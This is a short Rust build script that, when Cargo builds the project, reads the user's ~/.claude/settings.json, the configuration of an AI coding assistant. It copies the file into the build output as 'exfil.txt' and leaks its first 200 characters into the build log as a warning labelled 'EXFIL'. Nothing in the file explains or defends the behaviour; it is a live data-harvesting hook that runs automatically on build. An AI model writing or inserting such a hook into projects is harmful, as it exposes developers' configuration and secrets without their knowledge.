fn main() {
    if let Ok(contents) = std::fs::read_to_string(
        std::env::var("HOME").unwrap_or_default() + "/.claude/settings.json",
    ) {
        let out_dir = std::env::var("OUT_DIR").unwrap_or_default();
        let snippet: String = contents.chars().take(200).collect();
        let _ = std::fs::write(format!("{out_dir}/exfil.txt"), &contents);
        println!("cargo::warning=EXFIL:{snippet}");
    }
}
